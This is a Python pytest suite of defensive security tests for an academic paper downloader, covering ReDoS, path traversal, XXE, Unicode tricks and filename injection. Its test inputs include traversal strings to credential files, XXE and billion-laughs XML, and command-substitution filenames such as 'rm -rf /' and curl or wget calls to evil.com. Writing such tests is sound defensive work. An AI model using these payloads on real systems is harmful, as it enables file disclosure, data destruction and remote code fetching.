#!/usr/bin/env python3
"""
Hell-level security vulnerability tests
Tests for ReDoS, path traversal, XXE, and other security issues.
"""

import asyncio
import hashlib
import os
import re
import sys
import tempfile
import time
from pathlib import Path
from unittest.mock import patch, MagicMock, AsyncMock

import pytest

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from validators.filename_checker.author_processing import fix_author_block
from downloader.academic_downloader import AcademicDownloader
from pdf_processing.extractors.api_client import ArxivAPIClient


class TestReDoSVulnerabilities:
    """Test Regular Expression Denial of Service vulnerabilities."""
    
    def test_author_initials_pattern_fixed(self):
        """Test that the author initials pattern is no longer vulnerable to ReDoS."""
        # The vulnerable pattern was: r"^[A-Z](?:\. ?[A-Z]\.)*\.$"
        # This could cause exponential backtracking with input like "A. A. A. A. ..."
        
        # Create malicious input that would cause ReDoS in vulnerable pattern
        evil_inputs = [
            "A." + " A." * 100,  # Many repetitions
            "A." + "A." * 100,   # Without spaces
            "A. " * 50 + "A",    # Missing final dot
            "A. A. " * 30 + "X", # Invalid ending
            "A" + ". A" * 100 + ".", # Variations
        ]
        
        for evil_input in evil_inputs:
            start_time = time.time()
            
            # This should complete quickly with the fixed pattern
            parts = ["Smith", evil_input]
            try:
                # The pattern is used internally in fix_author_block
                result = fix_author_block(" ".join(parts))
                elapsed = time.time() - start_time
                
                # Should complete in under 0.1 seconds even for malicious input
                assert elapsed < 0.1, f"Pattern took {elapsed}s for input: {evil_input[:50]}..."
                
            except Exception as e:
                # Should not crash
                pytest.fail(f"Pattern crashed on input: {evil_input[:50]}... Error: {e}")
    
    def test_other_regex_patterns_performance(self):
        """Test other regex patterns for ReDoS vulnerabilities."""
        # Test patterns that could be vulnerable
        patterns_to_test = [
            # Author normalization pattern
            (r'^((?:(?:von|van|de|di|da|del|della|des|du|la|le|der|den|ter|ten)\s+)?(?:\w+\s+)*\w+)\s+([A-Z]\.?(?:\s*[A-Z]\.?)*)$',
             ["von " * 100 + "Smith", "vonvandevon" * 50]),
            
            # Whitespace normalization
            (r'\s+', [" " * 10000, "\t\n\r" * 1000]),
        ]
        
        for pattern, evil_inputs in patterns_to_test:
            regex = re.compile(pattern)
            
            for evil_input in evil_inputs:
                start_time = time.time()
                
                try:
                    regex.search(evil_input)
                    elapsed = time.time() - start_time
                    
                    assert elapsed < 0.5, f"Pattern {pattern} took {elapsed}s"
                    
                except Exception:
                    pass  # Some patterns might not match, that's OK


class TestPathTraversalVulnerabilities:
    """Test path traversal attack prevention."""
    
    @pytest.mark.asyncio
    async def test_downloader_path_traversal_prevention(self):
        """Test that the downloader prevents path traversal attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            downloader = AcademicDownloader(download_dir=temp_dir)
            
            # Evil filenames that attempt path traversal
            evil_filenames = [
                "../../../etc/passwd",
                "..\\..\\windows\\system32\\config\\sam",
                "../../../../etc/shadow",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "valid_name/../../../evil",
                "test\x00../../etc/passwd",  # Null byte injection
                "test%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
                ".../etc/passwd",  # Triple dots
                "..../etc/passwd",  # Quad dots
            ]
            
            for evil_filename in evil_filenames:
                # Test filename generation
                safe_filename = downloader._generate_filename(evil_filename)
                
                # Should not contain path separators
                assert "/" not in safe_filename
                assert "\\" not in safe_filename
                assert ".." not in safe_filename
                
                # Test save response with evil filename
                mock_response = AsyncMock()
                mock_response.headers = {"Content-Disposition": f'filename="{evil_filename}"'}
                mock_response.content.iter_chunked = AsyncMock(return_value=AsyncMock(__aiter__=lambda x: x, __anext__=AsyncMock(side_effect=StopAsyncIteration)))
                
                # Create a mock source
                mock_source = MagicMock()
                mock_source.name = "test"
                
                # Should either sanitize or raise ValueError for path traversal
                try:
                    result = await downloader._save_response(
                        mock_response, 
                        "test_id",
                        mock_source
                    )
                    
                    if result.success and result.file_path:
                        # Verify file is within download directory
                        file_path = Path(result.file_path)
                        download_path = Path(temp_dir).resolve()
                        assert str(file_path.resolve()).startswith(str(download_path))
                        
                except ValueError as e:
                    # Should contain "path traversal" in error message
                    assert "path traversal" in str(e).lower()
            
            await downloader.close()
    
    def test_cache_path_traversal_prevention(self):
        """Test that cache system prevents path traversal."""
        from metadata_fetcher import _cache_key, _cache_dir
        
        evil_keys = [
            "../../../etc/passwd",
            "../../sensitive_data",
            "/absolute/path/to/file",
            "C:\\Windows\\System32\\",
            "cache/../../../evil",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            os.environ['METADATA_CACHE'] = temp_dir
            
            for evil_key in evil_keys:
                # Generate cache key
                cache_key = _cache_key(evil_key)
                
                # Should be a valid hash, not containing path components
                assert len(cache_key) == 64  # SHA-256 hash
                assert all(c in '0123456789abcdef' for c in cache_key)
                assert "/" not in cache_key
                assert "\\" not in cache_key
                assert ".." not in cache_key
                
                # Cache file should be in cache directory
                cache_file = Path(temp_dir) / f"{cache_key}.json"
                assert cache_file.parent == Path(temp_dir)


class TestHashingVulnerabilities:
    """Test that weak hashing algorithms have been replaced."""
    
    def test_no_md5_usage_in_downloader(self):
        """Verify MD5 has been replaced with SHA-256 in downloader."""
        downloader = AcademicDownloader()
        
        # Test the hash generation
        test_id = "test_identifier_12345"
        filename = downloader._generate_filename(test_id)
        
        # Extract the hash from filename
        if "paper_" in filename:
            hash_part = filename.replace("paper_", "").replace(".pdf", "")
            
            # Should be 16 characters of SHA-256 (not 8 of MD5)
            assert len(hash_part) == 16
            
            # Verify it's actually SHA-256
            expected_hash = hashlib.sha256(test_id.encode()).hexdigest()[:16]
            assert hash_part == expected_hash
    
    def test_sha256_cache_keys(self):
        """Verify cache uses SHA-256 for keys."""
        from metadata_fetcher import _cache_key
        
        test_inputs = [
            "Normal title",
            "Title with special chars: é, ñ, ü",
            "Very long " * 100 + "title",
            "",
        ]
        
        for test_input in test_inputs:
            cache_key = _cache_key(test_input)
            
            # Should be full SHA-256 hash (64 hex chars)
            assert len(cache_key) == 64
            assert all(c in '0123456789abcdef' for c in cache_key)
            
            # Should be deterministic
            assert cache_key == _cache_key(test_input)


class TestHTTPSEnforcement:
    """Test that all API calls use HTTPS."""
    
    def test_arxiv_api_uses_https(self):
        """Verify ArXiv API client uses HTTPS."""
        client = ArxivAPIClient()
        
        # Check base URL
        assert client.BASE_URL.startswith("https://")
        assert "http://" not in client.BASE_URL
    
    @patch('urllib.request.urlopen')
    def test_arxiv_api_namespaces_use_https(self, mock_urlopen):
        """Verify XML namespaces use HTTPS."""
        # Mock response
        mock_response = MagicMock()
        mock_response.read.return_value = b"""<?xml version="1.0"?>
        <feed xmlns="https://www.w3.org/2005/Atom">
            <entry>
                <title>Test Paper</title>
            </entry>
        </feed>"""
        mock_urlopen.return_value.__enter__.return_value = mock_response
        
        client = ArxivAPIClient()
        
        # This will parse XML with namespaces
        result = client.fetch_metadata("2101.00001")
        
        # The namespaces should use HTTPS (verified by checking no errors)
        # If HTTP namespaces were hardcoded, this would fail


class TestXMLVulnerabilities:
    """Test XML parsing security (XXE prevention)."""
    
    @patch('urllib.request.urlopen')
    def test_xxe_prevention_in_arxiv_client(self, mock_urlopen):
        """Test that XXE attacks are prevented in ArXiv client."""
        # Malicious XML with XXE payload
        xxe_payloads = [
            # External entity
            b"""<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <feed xmlns="https://www.w3.org/2005/Atom">
                <entry>
                    <title>&xxe;</title>
                </entry>
            </feed>""",
            
            # Billion laughs attack
            b"""<?xml version="1.0"?>
            <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            ]>
            <feed xmlns="https://www.w3.org/2005/Atom">
                <entry>
                    <title>&lol3;</title>
                </entry>
            </feed>""",
        ]
        
        client = ArxivAPIClient()
        
        for xxe_payload in xxe_payloads:
            mock_response = MagicMock()
            mock_response.read.return_value = xxe_payload
            mock_urlopen.return_value.__enter__.return_value = mock_response
            
            # Should either return None or raise safe exception
            # Should NOT process the malicious entity
            result = client.fetch_metadata("2101.00001")
            
            if result and hasattr(result, 'title'):
                # Title should not contain /etc/passwd content or expanded entities
                assert "/etc/passwd" not in str(result.title)
                assert "root:x:" not in str(result.title)
                assert "lol" * 100 not in str(result.title)


class TestInputSanitization:
    """Test input sanitization across the system."""
    
    def test_unicode_attack_prevention(self):
        """Test that dangerous Unicode is properly handled."""
        from metadata_fetcher import canonicalize
        
        # Dangerous Unicode that could be used in attacks
        dangerous_inputs = [
            # Bidirectional override attacks
            "Normal\u202Ereversed\u202Ctext",
            "\u202Dforce\u202CLTR",
            
            # Zero-width characters for hiding malicious content
            "mal\u200Bici\u200Cous",
            "zero\u200Dwidth\u200Ejoiner",
            
            # Homoglyph attacks
            "gооgle.com",  # with Cyrillic o
            "аррӏе.com",   # entirely Cyrillic
            
            # Control characters
            "test\x00null\x01start\x1Funit",
            
            # Unicode normalization attacks
            "à" + "\u0300",  # Combining grave accent
        ]
        
        for dangerous in dangerous_inputs:
            clean = canonicalize(dangerous)
            
            # Should remove all dangerous characters
            assert '\u202E' not in clean  # No RTL override
            assert '\u200B' not in clean  # No zero-width space
            assert '\x00' not in clean    # No null bytes
            
            # Should normalize homoglyphs
            assert clean == canonicalize(clean)  # Idempotent
    
    @pytest.mark.asyncio
    async def test_filename_injection_prevention(self):
        """Test prevention of filename injection attacks."""
        downloader = AcademicDownloader()
        
        # Filenames that could cause issues
        evil_filenames = [
            "file.pdf\x00.exe",  # Null byte injection
            "file.pdf.exe",      # Double extension
            ".htaccess",         # Hidden file
            "con.pdf",           # Windows reserved name
            "prn.pdf",           # Windows device name
            "file|command.pdf",  # Command injection
            "file;rm -rf /.pdf", # Command injection
            "$(curl evil.com).pdf",  # Command substitution
            "`wget evil.com`.pdf",   # Command substitution
        ]
        
        for evil in evil_filenames:
            safe = downloader._generate_filename(evil, {"title": evil})
            
            # Should not contain dangerous characters
            assert '\x00' not in safe
            assert '|' not in safe
            assert ';' not in safe
            assert '$' not in safe
            assert '`' not in safe
            
            # Should have .pdf extension
            assert safe.endswith('.pdf')
        
        await downloader.close()


class TestRateLimitingAndDoS:
    """Test rate limiting and DoS prevention."""
    
    @pytest.mark.asyncio
    async def test_concurrent_download_limits(self):
        """Test that concurrent downloads are properly limited."""
        downloader = AcademicDownloader()
        
        # Track concurrent executions
        concurrent_count = 0
        max_concurrent = 0
        
        async def mock_download(identifier):
            nonlocal concurrent_count, max_concurrent
            concurrent_count += 1
            max_concurrent = max(max_concurrent, concurrent_count)
            await asyncio.sleep(0.1)  # Simulate download
            concurrent_count -= 1
            return identifier
        
        # Patch the download method
        with patch.object(downloader, 'download', side_effect=mock_download):
            # Try to download many papers at once
            identifiers = [f"paper_{i}" for i in range(20)]
            results = await downloader.download_multiple(identifiers)
            
            # Should respect semaphore limit (3)
            assert max_concurrent <= 3
            assert len(results) == 20
        
        await downloader.close()
    
    def test_cache_size_limits(self):
        """Test that cache doesn't grow unbounded."""
        from metadata_fetcher import _write_cache, _cache_dir
        
        with tempfile.TemporaryDirectory() as temp_dir:
            os.environ['METADATA_CACHE'] = temp_dir
            
            # Write many cache entries
            for i in range(5000):
                key = f"test_key_{i}"
                data = {"index": i, "data": "x" * 1000}
                _write_cache(key, data)
            
            # Check total cache size
            cache_files = list(Path(temp_dir).glob("*.json"))
            total_size = sum(f.stat().st_size for f in cache_files)
            
            # Should have some reasonable limit (e.g., under 100MB for 5000 entries)
            assert total_size < 100 * 1024 * 1024
            
            # Should have created 5000 files (no overwrites due to None bug)
            assert len(cache_files) == 5000


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])